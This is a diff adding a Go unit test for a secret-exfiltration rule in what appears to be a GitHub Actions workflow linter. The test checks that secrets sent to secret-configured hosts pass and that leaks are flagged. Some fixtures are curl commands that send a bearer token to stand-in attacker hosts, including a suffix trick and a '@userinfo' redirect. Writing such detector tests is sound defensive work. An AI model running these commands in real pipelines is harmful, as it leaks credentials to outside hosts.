@@ -581,6 +581,128 @@ func TestSecretExfiltration_EnvVarLeak(t *testing.T) {
 	}
 }
 
+func TestSecretExfiltration_SecretAdministeredDestination(t *testing.T) {
+	tests := []struct {
+		name        string
+		envVars     map[string]*ast.EnvVar
+		runScript   string
+		wantErrors  int
+		description string
+	}{
+		{
+			name: "secret in -H header to secret-derived destination (legitimate)",
+			envVars: map[string]*ast.EnvVar{
+				"ORCHESTRA_API_URL": {
+					Name:  &ast.String{Value: "ORCHESTRA_API_URL"},
+					Value: &ast.String{Value: "${{ secrets.ORCHESTRA_API_URL }}", Pos: &ast.Position{Line: 1, Col: 1}},
+				},
+				"ORCHESTRA_SYNC_API_KEY": {
+					Name:  &ast.String{Value: "ORCHESTRA_SYNC_API_KEY"},
+					Value: &ast.String{Value: "${{ secrets.ORCHESTRA_SYNC_API_KEY }}", Pos: &ast.Position{Line: 1, Col: 1}},
+				},
+			},
+			runScript:   `curl -s -X POST -H "X-Admin-API-Key: $ORCHESTRA_SYNC_API_KEY" "$ORCHESTRA_API_URL/api/admin/sync-github-skill"`,
+			wantErrors:  0,
+			description: "API key header to admin-configured API URL (both from secrets) is the intended auth flow",
+		},
+		{
+			name: "inline ${{ secrets.URL }} destination with secret header (legitimate)",
+			envVars: map[string]*ast.EnvVar{
+				"API_KEY": {
+					Name:  &ast.String{Value: "API_KEY"},
+					Value: &ast.String{Value: "${{ secrets.API_KEY }}", Pos: &ast.Position{Line: 1, Col: 1}},
+				},
+			},
+			runScript:   `curl -H "Authorization: Bearer $API_KEY" "${{ secrets.API_URL }}/api/admin/sync"`,
+			wantErrors:  0,
+			description: "inline secrets.* destination is administrator-controlled",
+		},
+		{
+			name: "secret in -H header to secret-derived destination with attacker suffix (exfiltration)",
+			envVars: map[string]*ast.EnvVar{
+				"API_URL": {
+					Name:  &ast.String{Value: "API_URL"},
+					Value: &ast.String{Value: "${{ secrets.API_URL }}", Pos: &ast.Position{Line: 1, Col: 1}},
+				},
+				"API_KEY": {
+					Name:  &ast.String{Value: "API_KEY"},
+					Value: &ast.String{Value: "${{ secrets.API_KEY }}", Pos: &ast.Position{Line: 1, Col: 1}},
+				},
+			},
+			runScript:   `curl -H "Authorization: Bearer $API_KEY" "$API_URL.evil.com/collect"`,
+			wantErrors:  1,
+			description: "literal attacker suffix on a secret-derived host must still be flagged",
+		},
+		{
+			name: "secret in -H header to secret-derived destination with userinfo trick (exfiltration)",
+			envVars: map[string]*ast.EnvVar{
+				"API_URL": {
+					Name:  &ast.String{Value: "API_URL"},
+					Value: &ast.String{Value: "${{ secrets.API_URL }}", Pos: &ast.Position{Line: 1, Col: 1}},
+				},
+				"API_KEY": {
+					Name:  &ast.String{Value: "API_KEY"},
+					Value: &ast.String{Value: "${{ secrets.API_KEY }}", Pos: &ast.Position{Line: 1, Col: 1}},
+				},
+			},
+			runScript:   `curl -H "Authorization: Bearer $API_KEY" "$API_URL@attacker.com"`,
+			wantErrors:  1,
+			description: "@userinfo redirect to attacker host must still be flagged",
+		},
+		{
+			name: "secret in header to unresolvable non-secret variable destination (exfiltration)",
+			envVars: map[string]*ast.EnvVar{
+				"API_KEY": {
+					Name:  &ast.String{Value: "API_KEY"},
+					Value: &ast.String{Value: "${{ secrets.API_KEY }}", Pos: &ast.Position{Line: 1, Col: 1}},
+				},
+			},
+			runScript:   `curl -H "Authorization: Bearer $API_KEY" "$UNKNOWN_HOST/collect"`,
+			wantErrors:  1,
+			description: "unresolvable non-secret destination must still be flagged",
+		},
+		{
+			name: "workflow-level env secret destination (legitimate)",
+			envVars: map[string]*ast.EnvVar{
+				"API_BASE": {
+					Name:  &ast.String{Value: "API_BASE"},
+					Value: &ast.String{Value: "${{ secrets.API_BASE }}", Pos: &ast.Position{Line: 1, Col: 1}},
+				},
+			},
+			runScript:   `curl -H "X-Key: ${{ secrets.KEY }}" "$API_BASE/v1/sync"`,
+			wantErrors:  0,
+			description: "secret destination declared at workflow level is trusted",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			rule := NewSecretExfiltrationRule()
+
+			step := &ast.Step{
+				Env: &ast.Env{
+					Vars: tt.envVars,
+				},
+				Exec: &ast.ExecRun{
+					Run: &ast.String{
+						Value: tt.runScript,
+						Pos:   &ast.Position{Line: 1, Col: 1},
+					},
+				},
+			}
+
+			job := &ast.Job{Steps: []*ast.Step{step}}
+			_ = rule.VisitJobPre(job)
+
+			gotErrors := len(rule.Errors())
+			if gotErrors != tt.wantErrors {
+				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
+					tt.description, gotErrors, tt.wantErrors, rule.Errors())
+			}
+		})
+	}
+}
+
 func TestSecretExfiltration_LegitimatePatterns(t *testing.T) {
 	tests := []struct {
 		name        string
